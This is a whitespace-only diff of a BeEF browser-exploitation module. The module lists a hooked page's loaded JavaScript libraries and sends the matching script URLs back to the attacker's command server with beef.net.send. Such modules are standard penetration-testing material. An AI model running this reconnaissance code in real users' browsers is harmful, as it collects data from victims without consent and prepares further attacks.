@@ -42,19 +42,20 @@ beef.execute(function() {
              "GWT": new Array("gwt","search-results"),
              "Atlas": new Array("AtlasRuntime","AtlasBindings","AtlasCompat","AtlasCompat2"),
              "jquery":new Array("jquery","jquery-latest","jquery-latest","jquery-1.5"),
-              "ExtJS":new Array("ext-all"),
-              "Prettify":new Array("prettify"),
+             "ExtJS":new Array("ext-all"),
+             "Prettify":new Array("prettify"),
              "Spry": new Array("SpryTabbedPanels","SpryDOMUtils","SpryData","SpryXML","SpryUtils","SpryURLUtils","SpryDataExtensions","SpryDataShell","SpryEffects","SpryPagedView","SpryXML"),
-               "Google JS Libs":new Array("xpath","urchin","ga"),
-               "Libxmlrequest":new Array("libxmlrequest"),
-               "jx":new Array ("jx","jxs"),
-               "bajax":new Array("bajax"),
-               "AJS": new Array ("AJS","AJS_fx"),
-               "Greybox":new Array("gb_scripts.js"),
-               "Qooxdoo":new Array("qx.website-devel","qooxdoo-1.6","qooxdoo-1.5.1","qxserver","q","q.domain","q.sticky","q.placeholder","shCore","shBrushScript"),
+             "Google JS Libs":new Array("xpath","urchin","ga"),
+             "Libxmlrequest":new Array("libxmlrequest"),
+             "jx":new Array ("jx","jxs"),
+             "bajax":new Array("bajax"),
+             "AJS": new Array ("AJS","AJS_fx"),
+             "Greybox":new Array("gb_scripts.js"),
+             "Qooxdoo":new Array("qx.website-devel","qooxdoo-1.6","qooxdoo-1.5.1","qxserver","q","q.domain","q.sticky","q.placeholder","shCore","shBrushScript"),
                
-             };
-    function fp() {
+     };
+
+     function fp() {
         try{ 
             var sc = document.scripts;
             var urls ="";
@@ -89,5 +90,7 @@ beef.execute(function() {
             beef.net.send("<%= @command_url %>", <%= @command_id %>, "script_urls="+results.toString());
         }
     }
+
     fp();
+
 });
